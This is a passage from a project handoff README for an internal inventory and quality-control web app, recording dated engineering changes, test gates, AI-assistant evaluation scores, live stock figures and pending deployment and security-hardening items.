>   stock invisible to the shelf report, to planning and to everyone. **Goods
>   are now received and shipped with or without a certificate; nothing may be
>   ISSUED without one.** Both gates therefore bind at the same moment, at
>   `stage_consumption` **and** `approve_smr`.
>   * **Stated once, in the operator's own words (re-confirmed 2026-09-01):**
>     *material without an MTC CAN be sent/dispatched to the site; it CANNOT be
>     issued or consumed at the site.* Audited on 2026-09-01 against
>     `services/quality.py`, `warehouse.create_dn`/`ship_dn`, `entry.py`,
>     `ledger.stage_consumption`, `supervisor.approve_smr` and
>     `execution.post_stock`: **the code already does exactly this and needed no
>     change.** What did need correcting was `docs/ARCHITECTURE.md`, which still
>     carried the pre-2026-08-12 sentence "MTC hard-block for `Surface Shields`
>     receipts" and told a reader the opposite of the truth. The rule now has a
>     table of its own at ARCHITECTURE §4b and a one-line statement at
>     USER_MANUAL §22.1, which is also what the Hub Assistant retrieves.

> **Updated 2026-09-01 — the OCR envelope, and three Bloom filters.**
>
> * **⚠️ THE VISION MODEL WAS NEVER THE PROBLEM.** Two production reports — "the
>   Consumption Log fails silently" and "the new Phase 9 PDF hangs with a
>   ReadTimeout" — were both diagnosed as `qwen2.5vl:7b` being bad at free-form
>   tables. Reproduced on the operator's own three files, it read every one of
>   them correctly and was cut off by the limits AROUND it. The Delivery Note
>   lane never failed for exactly the reason it looked like a model problem: a
>   DN is four items and always fitted the envelope.
> * **THE THREE NUMBERS ARE ONE DECISION** (ARCHITECTURE §7a): the per-lane
>   output budget, `num_ctx`, and the HTTP timeout. **Ollama runs this model at
>   `n_ctx=4096` regardless of the 128k on its model card**, and an 1800 px page
>   is 3,120 prompt tokens of that — so raising `num_predict` alone ABORTED the
>   runner (`ggml_abort`, SIGABRT), took every queued job with it, and returned
>   an empty body with no error field. Never move one of the three without the
>   others; suite CP-05 fails if you do.
> * **A CLIPPED REPLY IS SALVAGED, NOT DISCARDED** (`ocr.salvage_truncated_json`).
>   The cut is only ever made at a CLOSING BRACKET — proof the value before it
>   was written in full — and the unfinished element is dropped, never patched.
>   Cutting at the last comma would keep a row whose material was read and whose
>   quantity was not.
> * **Measured, on this hardware, 2026-09-01:** DN 98 s / 4 items · consumption
>   log 361 s / **30 rows** (was: total failure) · Phase 9 form PDF 444 s /
>   5 rows + QR (was: ReadTimeout at 240 s). The 900 s vision ceiling is sized
>   from those, not guessed.
> * **Nothing read is a FAILURE, not a result**, and **an unreadable quantity
>   stays `null`** — the prompt always said "never invent 0 or 1" and
>   `clean_consumption_row` invented it anyway (`_to_float(None) == 0.0`), so
>   every ambiguous box reached the review grid as a confident zero.
> * **Bloom filters** on username / SAP code / asset serial (ARCHITECTURE §7b).
>   ⚠️ The discipline that makes them safe on more than one uvicorn worker: **a
>   "definitely not present" may retire a READ and may NEVER authorise a WRITE.**
>   Every UNIQUE index stays exactly where it was. Do not "simplify" this by
>   letting the filter decide an insert — this process's bits are a snapshot,
>   and another worker's write is not in them.
> * **`ai_jobs` stopped keeping photographs forever** (alembic `b8d3f1a72c94`).
>   The workers NULL `payload_json` on both terminal transitions, and the table
>   is now indexed on `(kind, status, created_at)` — the orphan sweep and the
>   submission-summary cache were both sequential scans over rows carrying
>   base64 images. `kind='submission_summary'` is EXCLUDED from the purge: it
>   stores its cache KEY there, and purging it would silently disable the cache.
> * **`SAP_INTEGRATION_QUESTIONNAIRE.md`** (repo root) is the scoping document
>   for the legacy SAP ERP feed — Employee / Equipment / Material, read-only,
>   one-way. No application code exists for it yet, deliberately.

> **Updated 2026-09-02 — PHASE 10 SLICE 10a** (Tracks 4 + 1). Plan and locked
> rulings in `PROPOSED_PHASE10_PLAN.md`; architecture in ARCHITECTURE §7c.
>
> * ⚠️ **THE PHASE 10 BRIEF WOULD HAVE REBUILT SHIPPED CODE.** Audited before
>   planning: 2FA was already complete (pyotp, enrol/verify/disable, the login
>   challenge, the step-up password check, `SecurityPage.tsx`, and the
>   `totp_secret`/`totp_enabled` columns); the MTC chase sweep already existed
>   in `health_monitor`; the branded PDF engine already existed in `exec_pdf`.
>   Operator agreed the re-scope: **extend three tracks, build two.** Twilio and
>   reportlab were dropped — Meta WhatsApp Cloud API and fpdf2 are already live,
>   and a second vendor/renderer buys nothing.
> * **Q1 ruling — POSTGRES, NOT REDIS, re-confirmed.** `rate_buckets` (alembic
>   `d5b8c3f92a41`) generalises the `login_attempts` mechanism to the four
>   limiters that were still per-process. On `--workers 4` each enforced **4x**
>   its documented limit; the second-factor attempt budget was 5 documented / 20
>   actual, against a `_verify_totp` that accepts three codes at any instant.
>   ⚠️ **FAILS OPEN** — the opposite of the access matrix, which fails closed,
>   and the two are meant to differ.
> * ⚠️ **`read_bucket_shared` IS NOT A STYLE VARIANT OF `check_bucket_shared`.**
>   The counting one INCREMENTS, so asking it "is this IP banned?" creates the
>   ban — the first invalid webhook signature answered 429 instead of 403 until
>   suite `limits` caught it. A test and a tally are different verbs.
> * **2FA is mandatory for `admin, logistics, hod, qc_hod, auditor`**, 14-day
>   grace, admin-reset recovery. ⚠️ **The `enroll`-scoped token opens ONLY
>   `/auth/2fa/*` and NOT `/2fa/disable`.** Minting an ordinary access token for
>   a user who must enrol would make "you must set up 2FA" the way to skip it,
>   and the account would be exempt AND believed protected. Suite CR-05.
>   ⚠️ Every uncertain branch in `mfa_gate` resolves towards ACCESS — no
>   settings row, a bad date, an empty role list all mean warn-only. A bug in
>   the rollout of a control must not lock the company out.
> * **`tests/ai_eval/` — Tier 1 is a hard gate (suite CQ), Tier 2 is a scored
>   artefact.** Wiring the stochastic half into CI would make the build flaky,
>   and a flaky gate is one people re-run rather than read.
> * ⚠️ **THE POLICY PIN EXISTS BECAUSE THE STRUCTURAL CHECK IS SELF-REFERENTIAL.**
>   Tier 1 compares a prompt's chapters against `allowed_sections(role)` — the
>   same allowlist that built it — so a WIDENING is invisible to it. Negative
>   control: granting a Store Keeper chapters 7 and 17 failed **zero**
>   structural checks. `cases/policy.yaml` pins the allowlists as data.
> * 📌 **OPEN FINDING, NOT A REGRESSION — Tier 2 security scored 43% against a
>   95% target** (llama3.1:8b, 2026-09-02). Tier 1 was 24/24 with **zero
>   leaks** on the same run, so nothing forbidden reached the model. The misses
>   are the model preferring to ANSWER an out-of-scope question: partly from
>   adjacent ALLOWED chapters (a Store Keeper's own §10/§11 define
>   `force_closed`, so that one is a question about what the manual tells whom),
>   and partly by CONFABULATION — asked "what is on the Service Health card?"
>   it described one, having provably never been shown chapter 7. The second is
>   a groundedness failure and the fix is prompt work. **Deliberately not
>   bundled into the slice that built the measuring instrument**, and the
>   threshold was deliberately NOT lowered to make it green.
> * **Gates:** service tests **2126/0** (was 2102/0) · E2E 125/0 · legacy 599/0
>   · parity 5/5 on a clean cut · alembic single head `d5b8c3f92a41`.

> **Updated 2026-09-03 — PHASE 10 SLICE 10b** (Tracks 2, 3, 5). ARCHITECTURE §7d.
>
> * 🐛 ⚠️ **THE DAILY LOOPS HAD BEEN FIRING FOUR TIMES A DAY IN PRODUCTION.**
>   The brief asked me to "use the robust `last_run` atomic claim" on the new
>   07:00 work — the audit found that **none** of the three daily loops had one.
>   `report_center.scheduler_loop` claims; `briefing_loop`, `digest_loop` and
>   `weekly_report_loop` each slept until their hour and dispatched in EVERY
>   worker, and `deploy/Dockerfile.api` runs `uvicorn --workers 4`. Every
>   morning briefing, evening digest and Friday executive PDF reached every
>   recipient four times. Invisible in dev (one worker) and in the tests (the
>   loops are off under `GI_SCHEDULER=0`). Closed by `services/dailyjob.py`
>   (alembic `e7f2a4c916b8`), applied to all three.
> * ⚠️ **The claim must stay ONE statement and `due` must be the SCHEDULED
>   time.** Select-then-update is a check-then-write, and four workers waking on
>   the same tick is exactly that window; comparing against `now` lets a worker
>   a second behind re-claim the same run. It **fails CLOSED** — the opposite of
>   the rate limiter, because a missed briefing is silence somebody notices and
>   a double-claimed one is four messages everybody ignores.
> * **Track 2.** `sme_execution_entry.Shift` ('Day'/'Night'/NULL — ⚠️ NULL is
>   SKIPPED, never assumed; there is no honest backfill and reading it as 'Day'
>   would make the probe scream about a year of history). Channels are chosen by
>   WHO is asked: in-app+WhatsApp to colleagues, **email to Logistics only**,
>   and **WhatsApp DRAFT for anyone outside the company** (`whatsapp.draft_text`
>   → `status='draft'`, released by a human at
>   `POST /admin/whatsapp/{id}/approve`). `_po_for` returns None rather than a
>   plausible wrong PO — a chase quoting the wrong order is worse than one
>   quoting none. Rides the SAME 07:00 claim, not a second 07:30 timer.
> * ⚠️ **Track 3 — EVERY `Unit_Cost` ON THE LIVE DATA IS 0.** A naive valuation
>   reports SAR 0.00 for a site holding 731 units: arithmetically correct and a
>   lie a board would act on. Un-costed lines are counted and excluded as
>   **"Not Valued (N items)"** with a footnote calling the total a FLOOR, plus a
>   coverage %. ERP and SME figures are printed side by side and **never added**
>   (rule 1a); `months_cover` is None when burn is zero; the burn rate divides
>   by the FULL window, not by days that had activity. fpdf2 only —
>   `_ValuationPDF` subclasses `_ExecPDF` so there is one branding
>   implementation. admin/HOD/auditor via `_EXEC_READERS`.
> * ⚠️ **Track 5 — THE GATE NEVER REFUSES** (ruling Q5.1).
>   `GET /training/gate/{feature}` returns `allowed: true` unconditionally; only
>   `show_interstitial` varies. "Watch Later" is POSTed, counted, and shown to
>   the HOD with a name against it — the control is VISIBILITY. **If a future
>   slice makes it hard, the refusal must move server-side into
>   `POST /execution/ocr/upload`; a UI-only gate is not a control.**
> * ⚠️ **`module_version` is in the compliance unique key.** A version bump
>   invalidates every prior acknowledgement by construction; old rows are KEPT
>   (auditable) but stop matching. Keyed on (user, module) alone, re-recording a
>   tutorial would certify everybody against a video they have never seen —
>   worse than no record, because it would be produced as evidence.
>   Videos are URIs, never blobs (Q5.3). Languages en · ta · ta-Latn · ar.
> * ⚠️ **The HOD dashboard is driven from `users`, not `training_compliance`** —
>   listing the compliance table shows only people who have engaged, hiding the
>   one person most worth seeing. The absence is the finding.
> * **Tier 2 prompt fix: security 43% → 64%, false-refusal still 0%.** An
>   explicit anti-confabulation rule in `_SYSTEM_PROMPT_TMPL` ("if the CONTEXT
>   does not name the thing being asked about, you do not know about it"). It
>   did not buy compliance by making the assistant useless, which was the risk.
>   📌 **STILL SHORT OF THE 95% TARGET, and the threshold was again not
>   lowered.** The five remaining misses are two things: some are arguably
>   CORRECT (§2's access matrix legitimately tells every role what an Admin may
>   do), and the rest are an 8B model inventing UI no chapter describes. The
>   lever is a larger chat model, not more prompt text.
> * **Gates:** service tests **2167/0** (was 2126/0) · E2E 125/0 · legacy 599/0
>   · parity 5/5 on a clean cut · nav 50/50 · Tier 1 evals 24/24, 0 leaks ·
>   alembic single head `e7f2a4c916b8`.
>   * The receipt block was traded for a **chase-up to Logistics**
>     (`quality.warn_mtc_missing`) — without that the ruling deletes a control
>     rather than moving it.
>   * **Certificates are INHERITED down the chain** (`quality.visible_mtc`):
>     uploaded against the PO line by Logistics, against the DN by the
>     warehouse, or at the site by the SK, ranked most-specific-first. A site
>     never re-uploads a document that exists upstream, and a certificate for
>     site A does **not** clear site B — it attests to one batch, and matching
>     on material alone would be a gate that opens once and never closes.
>   * ⚠️ **Do not "restore" the receipt or DN block.** Suite BM asserts
>     `assert_mtc` is absent from `warehouse.receive` and `create_dn`, and
>     `qsep-mtc.spec.ts` drives the whole chain end to end.
> * **R4/R5 — the PPE forecast is deterministic, and the window is 15 days.**
>   `suggested = expiring − on_hand − on_order`, floored at 0, with employee
>   NAMES attached. No statistical model: 22 roster workers and no history is
>   not a thing to fit a model to.
> * **Q1 — QC is a dedicated person**, separate from `warehouse_user`.
> * **Q4 — rejected material is NOT auto-routed to Vendor Returns.** It stays in
>   stock, pending/unusable, blocked from issue. An automatic return removes the
>   evidence before anyone has looked at it.
> * **Q5 — no WhatsApp for expired PPE.** Expiry is a **suggested replacement
>   date**, not a restriction; the in-app 15-day table is the whole mechanism.
>
> Two structural notes worth carrying forward. `entry_attachments.Site_ID` is
> now **nullable** (alembic `e6a91c37b208`) because a PO scan is uploaded by
> Logistics, who are unscoped by design — a NULL reads correctly under the
> Document Library's existing scoping, since a scoped caller filters on a site
> and a NULL never matches. And **narrowing the asset key broke `bulk_import` in
> two places** the rename surfaced: an `ON CONFLICT ON CONSTRAINT` naming the
> old constraint (a hard failure on every Excel asset sync) and a planner that
> only looked for existing serials at the importing site.

| Gate | Result | Command |
|---|---|---|
| **Harness hygiene** — runs FIRST | **10 controls, 0 failed** (~1 s, no services). Rule 16 | `bash bin/ci_preflight.sh` |
| Backend service tests | **2,328 / 0** (suites A…CX, **own throwaway DB**) | `GI_DOTENV=0 .venv/bin/python -m backend.api.service_tests` |
| Playwright E2E | **128 / 128** (~55 s, own throwaway DB) | `cd tests/e2e && npm test` |
| **AI evals — Tier 1** | **147 / 147, 0 leaks** · retrieval recall **1.000** / precision **0.994** (floor 0.85). Deterministic; also runs inside suite CQ | `.venv/bin/python -m tests.ai_eval.runner` |
| AI eval grid | **generated, 72 verified cases** — `--check` fails if the manual moved (P11-12) | `.venv/bin/python tools/gen_eval_grid.py --check` |
| AI evals — Tier 2 | 📌 **scored, NEVER a gate** (ruling P10-7). security **64%** vs a 95% target · false-refusal 0%. Stochastic, needs a live model. A KNOWN MODEL CONSTRAINT, not a backlog item | `… --tier2 --json scorecard.json` |
| SME TS↔PY parity | **1,313 comparisons** | `npm run parity:sme --prefix frontend` |
| **SME UI math** (session.ts + insights.ts) | **33 / 0** | `npm run test:ui-math --prefix frontend` |
| Legacy regression | **599 / 0 / 0** ⚠️ needs `DYLD_FALLBACK_LIBRARY_PATH=/opt/homebrew/lib` on macOS or the QR check SKIPS (rule 16) | `.venv/bin/python legacy/bug_check.py` |
| Navigation route coverage | **51 routes, all claimed** | `npm run test:nav --prefix frontend` |
| ~~Derived-view parity~~ | ❌ **RETIRED as a gate 2026-08-05** — see below | `tools/parity_check.py` |
| Frontend | `tsc -b` + `npm run build` + `oxlint` ✅ | `npm run build --prefix frontend` |
| Alembic | single head **`a1c9e64b3d70`** | see ARCHITECTURE §8 |
| 🎬 Tutorial renders | **NOT A GATE, by design** (Phase 12). A tutorial that renders badly is one to re-render, not a red build. `--dry-run` lints scripts without a browser | `.venv/bin/python tools/generate_tutorial.py --all --dry-run` |
| **Manual PDFs** | **0 overlapping text pairs**, all 8 booklets | `.venv/bin/python build_manual_pdf.py --role all` |
| `gi_database.db` | sha256 `00652932…ba038` **unchanged** | `shasum -a 256 gi_database.db` |

> The manual-PDF gate is new on 2026-08-09 and is a **geometry** check, not a
> smoke test: the builder reopens what it just wrote and counts pairs of words
> whose bounding boxes intersect. Rendered text never legitimately overlaps, so
> any hit is a row-height or Y-cursor defect. The table renderer shipped exactly
> such a defect for months — **104 overlapping pairs in the master manual** — and
> nothing in the build said a word, because a PDF that is visibly wrong is still
> a PDF that was produced without error.

> ⚠️ **`tools/parity_check.py` can no longer pass, and its failure means nothing.**
> It compares the frozen legacy SQLite against PostgreSQL. They have diverged
> permanently — `consumption` holds **1** row in SQLite against **1,133** in
> Postgres; `inventory` 306 against 466; `receipts` 70 against 575 — because every
> sync since cutover has written Postgres only, by design. It was a cutover-era
> guard and the cutover is over. **Do not spend a session trying to make it
> green.** Retiring the file outright, or re-baselining it against a fresh mirror,
> is an operator decision that has not been taken; it is left in place, unchanged,
> and off the gate list.

**Version numbers must agree across three files.**
`frontend/src-tauri/tauri.conf.json`, `frontend/package.json` and
`frontend/src-tauri/Cargo.toml` all carry the app version, currently **`1.2.0`**.
They had drifted to `0.1.0 / 0.0.0 / 0.1.0`, and because `tauri build` names every
installer from `tauri.conf.json`, tag **v1.2.0 published assets called
`GI Hub_0.1.0_x64-setup.exe`** — with no way to tell which build an installer came
from. `release-desktop.yml` now fails the build if the three disagree, or if they
disagree with the tag. The Android APK's internal version cannot live in a file
(`frontend/android/` is gitignored and regenerated every build), so
`release-android.yml` stamps it after `cap add android`; `versionCode` packs the
semver positionally (1.2.0 → 10200) because Android requires a monotonically
increasing integer and would otherwise refuse the upgrade.

**Local Cloudflare tunnelling is resolved and stable.** Verified 2026-07-30: a
single managed tunnel is running (the root LaunchDaemon,
`/Library/LaunchDaemons/com.cloudflare.cloudflared.plist`). The two rogue
user-level instances that caused the recurring **Error 1033** are gone, and the
dormant user LaunchAgent `com.gi.cloudflared` is unloaded. Diagnosis and the exact
recovery commands live in [`deploy/cloudflared/README.md`](deploy/cloudflared/README.md).

### What shipped most recently (merged to main)

| PR | Commit | What |
|---|---|---|
| #73-#76 | `feat/phase12-*` | **Phase 12 — Automated role-based video tutorials (2026-09-06/07).** A tutorial is a Playwright screencast of the real UI + a HeyGen avatar, composited locally into an MP4 for the training hub slice 10b already built. Seven **P12-x** rulings, above. **12a** `tools/make_tutorial_db.py` — the synthetic dataset (real structure, invented everything else; deterministic on a pinned `ANCHOR`), its own database `gihub_tutorial_pw` on :8011/:5184 with **no file under `tests/e2e/` edited**. **12b** the manifest (`script_sha256` is what ruling Q4 keys a compliance version bump on), WebVTT into the `captions_uri` column empty since 10b, and **freeze-padding** inside the composite filtergraph — which is what makes one screencast serve four languages. **12c** a **declarative** recorder (`steps:` in the YAML, one executor, because ~60 bespoke spec files would be 60 places for the harness to drift) plus four tutorials narrated from role-fenced manual chapters, checked against `manual_qa.allowed_sections()` itself. **12f** the assistant answers in text **and** deep-links into the second the step is on screen, behind the same fence rule 9 uses. Suite **CX** (15) |
| — | `feat/workflow-polish-and-test-isolation` | **Test isolation + four workflow refinements (2026-08-13).** The backend suite stopped writing to the live database (**rule 15**), which immediately exposed two schema defects — see below. **Procurement:** `po_list` now returns the assignment, so the grid replaces `Assign` with the warehouse it went to, and `assign_po` refuses a re-route while treating a repeat of the same warehouse as idempotent. **Shipping:** `ship_dn` demands the number on the PHYSICAL delivery note plus a scan of it (alembic `b4f21c8ea9d7`), surfaced in all five portals through one `DN_DOC_COLUMNS` / `DeliveryDocLink` pair. **Quality:** the inspection queue shows the material NAME and an openable certificate (scoping inherited from the inspection, not re-derived); a rejection mints a **Return No** the SK pastes into Return Stock to fill the form, capped, DN-mandatory regardless of the entry-document switch, and single-use (alembic `c7a93e5d2b18`). **Returns:** the 30-day source-receipt window was measured on the vendor's delivery date rather than on when the row entered the ledger, so goods received that morning were missing from the dropdown — `receipts.posted_at` fixes it without a backfill. **Health:** a ninth Morning Briefing probe for uncertified Surface Shields, routed by location to the people who can act. Suites **BW** (7) + **BX** (21) |
| #36 | `9f8be2e` | **QSEP slices 1-3 — Quality Control.** The `qc` role at level 1 with **dual scoping** (a site OR a warehouse, never both, and neither means it sees NOTHING); `/qc/accounts` creation by HOD/Warehouse/Logistics inside their own scope; QC site transfers as a REQUEST an **Admin** decides. MTC logic extracted to `services/quality.py`, mandatory at **DN creation**. The `qc_inspections` ledger, and the hard issuance block at **both** `stage_consumption` and `approve_smr` |
| #37 | `d481a37` | **QSEP slices 4-5 — PPE and Employees.** PPE via **Option A (Integrated)**: the *standard* Issue form grows `employee_id_number` + `safety_doc_id` when a PPE item is picked, and one transaction does the stock consumption AND the distribution. Mandatory `early_reason` when replacing unexpired gear. `employee_movements`, HOD immediate transfers, and PPE history keyed on the globally-unique `ID_Number` so it **carries over on transfer**. 15-day forecast netting stock and open POs, with employee names |
| #38 | `6447ddb` | **QSEP slice 6 — Procurement, OCR and asset polish.** `warehouse.auto_draft_dns` reusing `create_dn()` grouped by `rl_bl_family`; urgent reschedules bypassing the digest; OCR persisting uploads to `entry_attachments` **before** parsing, with the lane chosen by whether text was extractable rather than by MIME type; global `(SAP_Code, Serial_No)` asset identity + source-HOD-approved transfers; password policy 12→8 **with complexity**, in one place |
| #25 | `2877888` | **Overnight polish** — the assistant was reading the WRONG MANUAL (fenced `# 1.` shell comments parsed as chapters 1-4 and overwrote Introduction/Roles/Login/Store-Keeper for every role); BM25 retrieval replaced prompt-stuffing (**admin 178 KB → 4 KB**); idle sign-out; per-ACCOUNT login throttle; 7 benchmarked indexes (alembic `e7c3b95a41d2`); ⌘K material search; manual §20 Auditor + §21 feature update. Suite **BE** (40) + 4 E2E |
| #24 | `8284c37` | **Exports, roles and sysadmin** — overflow-proof PDFs (measured **4.1 mm** of column overlap and 28 destroyed characters); the premium branded xlsx layout applied to EVERY export (**header moved to row 6**); the view-only **Auditor** role (126 of 143 mutating routes blocked); `bin/power.sh` + `bin/backup_db.sh`. Suite **BD** (36) |
| — | `fix/sme-ordered-subset-rule` | **The subset rule** (rule 1c) — `Ordered_Qty` is the TOTAL procured and `Available_Qty` a subset of it, so tier 2 is `max(ordered − available, 0)`; the additive reading understated the buy list by 22,951 units and hid a 9,685-unit shortage on GI-8005763. Suite **BC** (16) + `test:ui-math` §E (7) |
| — | `fix/sme-final-math-alignment` | **Final math alignment** — scope-wide coverage → area-weighted bottleneck (57.7% → 7.8% on live data); Smart Calculator → `(Material_Code, SAP_Code)`; new `npm run test:ui-math` gate (20 checks) for the previously untested presentation layer |
| — | `fix/sme-strict-tier-segregation` | **SME tier segregation** (rule 1b) — readiness is TIER 1 everywhere; `session.ts codeStats`, Total Overview, Location Report, Execution Plan, Dashboard, exec summary + PDF, Smart Calculator, location export all split; `insights.ts` Material_Key lookup bug fixed; suite **BB** (18) + 4 E2E |
| — | `feat/sme-strict-decoupling` | **SME ⇄ ERP strict decoupling** (rule 1a) — ledger stripped from `SQL_SME_MATERIALS` + Smart Calculator, effective-ordered netting removed from both engines, golden regenerated, suite **BA** (11 checks), `pg_excel_sync` defaults to SME-only, `Available Qty` header alias |
| #15 | `7868e8d` | **Project-wide table sorting + filtering** — `smartTable.tsx`, 99 tables / 45 files, +3 E2E specs |
| #16 | `c62c415` | **SME component pooling fix** — `(Material_Code, SAP_Code)` everywhere, suite AZ (20 checks), alembic `a4e9b1c73f28` |

Immediately before those, on the same programme:

* **Two-tier allocation + reverse SQM** (`docs/SME_SQM_BOTTLENECK_RUNLOG.md`) —
  Available vs Ordered split, SQM-achievable bottleneck maths, Material-Wise
  Segregated Report.
* **Session-report aggregation** (`docs/SESSION_REPORT_SUMMARY_RUNLOG.md`) —
  Total Material Demand sheet leads the workbook and the PDF.
* **`tools/pg_excel_sync.py`** (`docs/PG_EXCEL_SYNC_RUNLOG.md`) — the atomic,
  idempotent, Postgres-native Excel sync.

### Live CNCEC numbers — decoupled, after the 2026-08-02 workbook re-sync

Both workbooks were re-synced on 2026-08-02 (`Equipment.xlsx` 58 rows changed,
`Materials_DetailsAvailable_Qty.xlsx` 30 rows changed, 0 rejects, re-run is a
no-op). These figures are now driven **only** by `sme_inventory_seed`.

| | Value | Previously |
|---|---|---|
| Component stock pools | **32** | 32 |
| Allocation lines | 352 | 352 |
| Material rows in reports | **30** | 30 |
| Remaining SQM | **42,403** | 49,435 |
| SQM achievable **now** | **3,312** (7.8%) | 2,778 (5.6%) |
| SQM achievable **with on-order** | **12,430** (29.3%) | 24,743 (50.1%) |
| Seed totals | 358,684 available · 483,196 on order | — |
| Multi-component materials | 4 (`GI-8005764/65/66/67`) | 4 |

The "with on-order" figure fell because the workbook's own `Ordered_Qty` column is
now the whole story — the old number was inflated by ERP receipts flowing into
availability on top of a full order.

### Known caveats carried forward

1. **Stock UOM is display-only** (ruling Q2). Recipe rates are per-SQM in `KG`
   while stock is in `Can`/`BAG`/`DR`/`EA` for 25 of 32 pairs, and `PACKAGE SIZE`
   is blank for every PU component — there is no conversion factor in the data.
   Quantities are taken to be in the recipe's unit. A real pack-size table is
   outstanding.
2. **The ERP `inventory` table has a UNIQUE on `Material_Code`**, so the variant
   SAPs cannot all carry it there — the sync reports this per SAP. Pre-existing and
   untouched; it means the *ERP* side still cannot express component identity.
   Wants its own decision.
3. **`tools/parity_check.py` fails against the live mirror BY DESIGN** — Postgres
   is permanently ahead of the frozen SQLite since the Excel injection. It is
   meaningful only on CI or a freshly-reloaded/cutover mirror. Since rule 1a its
   `sme_materials` rollup no longer compares `received_qty` / `consumed_qty`, and
   its `available_qty` comparison additionally asserts that the frozen dataset
   carries no ERP movement against an SME material (true on a fresh cutover). The
   decoupling itself is pinned by **suite BA**, which does not depend on that.
4. **`postgres-dual-ci.yml` has never passed on the GitHub runner** (always at the
   `legacy/bug_check.py` step) while the same tree passes 599/0 locally under every
   simulated CI condition. Cause is Linux-runner-specific and unresolved; failures
   now surface as `::error::` annotations plus uploaded artifacts.
5. **The dev database has been migrated and re-synced.** `alembic upgrade head` +
   a `sme-materials` workbook sync were applied to `:5433/gihub` so the suites
   could run against the new primary key. Rebuildable; the migration has a working
   `downgrade()`.

---

## FUTURE — what happens next

### The next session picks ONE of two tracks

As of 2026-08-06 the codebase is feature-complete, fully documented and green on
every live gate. Nothing is mid-flight. The next operator chooses:

**Track A — Tier 1 security hardening.** Roughly three days, from
[`SECURITY_SUGGESTIONS.md`](SECURITY_SUGGESTIONS.md), and it can be done before
or after deployment:

1. **Enforce 2FA for `admin` and `logistics`.** The machinery is built and
   correctly hardened; it is simply opt-in, so an admin password is currently the
   single factor guarding user creation, password resets and database backup.
   *Highest value of anything on the list.* Enrol two admins BEFORE flipping it.
2. **Move the OTP and 2FA limiters to a shared store.** `Dockerfile.api` runs
   four uvicorn workers and those budgets are per-process, so the real limits are
   ~4x what the code declares. The OTP one has a direct financial cost per bypass.
3. **Add dependency and static scanning to CI** — `pip-audit`, `npm audit`,
   `bandit`, Dependabot. There is none today. Start non-blocking.

**Track B — the Hetzner deployment**, below. Unchanged and still ready.

Either is a legitimate starting point. If deployment is imminent, do items 1 and
3 first — they are cheap, and both are harder to retrofit once real users are on
the box.

### Then: put data in the new tables

`storage_locations`, `material_locations` and `asset_units` are all **empty**. The
features are live and tested; nothing has been registered in them. Two routes, and
they compose:

1. **Fill the workbook columns.** `Rack/Current Location` on the Inventory sheet
   seeds shelves; `Location` **plus** `Serial No.` on the Consumption Log seeds
   assets. Both are read on the next `--erp` sync. `EXCEL_LOCATION_SYNC_RUNLOG.md`
   has a "what to type in the spreadsheet" section.
2. **Register in the app.** Assets → Register, and Locator → new rack. Anything
   entered this way is authoritative and no later sync will overwrite it.

Then: Assets → Move to set each tool's condition, since the workbook has no Status
column and the app is the only place condition can be recorded.

### Also worth an operator read-through

Suggested starting points, none of them committed to:

* The four multi-component materials now render as 4 rows each — worth an operator
  read-through of the SME Session Report, Execution Plan and Procurement views to
  confirm the density is right.
* `smartTable` filter labels come from the **raw** field value, so a column whose
  `render` maps codes to friendly labels lists the codes in its dropdown. Only
  `UsersPage` has been given an explicit `filters` override so far; other columns
  with label-mapping renders may want the same treatment.
* The stock-UOM display mismatch (caveat 1) is now visible in the UI.

### Phase 3 — Hetzner Ubuntu Docker deployment: **PAUSED**

Paused by decision on 2026-07-30, **not blocked**. Everything needed is built and
documented; it will be executed only after fine-tuning is complete.

When it resumes, the runbook is [`tools/migration/README.md`](tools/migration/README.md)
and the kit is [`docs/DEPLOY.md`](docs/DEPLOY.md) + [`deploy/`](deploy/). Open
operator items at the time of pausing:

* **Server side:** generate strong `JWT_SECRET` and `POSTGRES_PASSWORD` (both are
  `CHANGE_ME` in `deploy/.env`); set `GI_ENV=production` to arm the JWT boot guard.
* **Meta side:** approve the `gi_evening_summary` template (2 body vars, lang
  `en`); subscribe the webhook URL. The other four templates are LIVE.
* **Cloudflare (one-time, for the native apps):** a Zero Trust Access application
  for `gi.giinventory.com/api/*` with a **Bypass (Everyone)** policy — without it
  every native API call dies as a CORS-killed 302. Details: `docs/NATIVE_APPS.md` §6.
* ⚠️ **The tunnel token is passed as a command-line argument**, so it is visible in
  full to any local process via `ps aux`. Consider rotating it and moving it into
  the plist's `EnvironmentVariables` rather than `ProgramArguments`.

#### ⚠️ NEW 2026-08-13 — two cutover gaps found by running the tests against a cutover-built database

Both were invisible while the suite only ever ran against a database Alembic had
walked. They are **deployment** items, not test items.

1. **FIXED — schema.** `ux_asset_transfer_open` lived only in alembic
   `a3c17e9b25d4`, and `cutover_migrate.py` builds the schema with
   `metadata.create_all` from `models.py`. A production box would have loaded
   **without** the partial unique index that stops two sites both holding an
   open transfer claim on the same asset. It is now declared in `models.py`, and
   suite BW asserts it on a models-built schema. **The general rule: a
   constraint added in a migration must be added to `models.py` in the same
   commit, or it only exists on databases that were migrated rather than
   created.**

2. ✅ **CLOSED — data.** `cutover_migrate.py` used to STAMP `alembic_version`
   to head without running the migrations, so every revision that backfilled
   *data* was skipped on a freshly cut-over database. Known instance: alembic
   `d2f84b19e57c` set `employees."Site_ID"` for employee `30816`, and **a
   site-less employee is invisible to every supervisor request** (`create_smr`
   tests `(site or '') != site_id`, which no site satisfies).

   `run_data_migrations()` now replays every declared step after the stamp, and
   the cutover ABORTS if one fails rather than leaving a correct schema over
   uncorrected data. Verified on a real cut 2026-09-05: **13 data steps ran**,
   including `d2f84b19e57c`. Nothing needs replaying by hand before go-live.
   `testdb._apply_fixtures` lists what the suite
   depends on and is the closest thing to an inventory of it.

---

## Run logs — the detailed history

Each recent programme has its own run log with the rulings, the maths, the
revert-verification and the caveats:

| Log | Covers |
|---|---|
| [`EXCEL_LOCATION_SYNC_RUNLOG.md`](EXCEL_LOCATION_SYNC_RUNLOG.md) | **The Golden Rule** and **the workbook seeds / the app owns**: rack + asset seeding, "app wins" conflict resolution, material names beside codes, and what to type in the spreadsheet |
| [`OVERNIGHT_ASSET_TRACKING_RUNLOG.md`](OVERNIGHT_ASSET_TRACKING_RUNLOG.md) | The asset + locator schema, the GPS scanner, tank aliases, the app-wins SQM override |
| [`OVERNIGHT_OPTIMIZATION_RUNLOG.md`](OVERNIGHT_OPTIMIZATION_RUNLOG.md) | Rules 9-11: the manual fence bug, BM25 retrieval, idle logout, per-account throttle, benchmarked indexes, ⌘K material search |
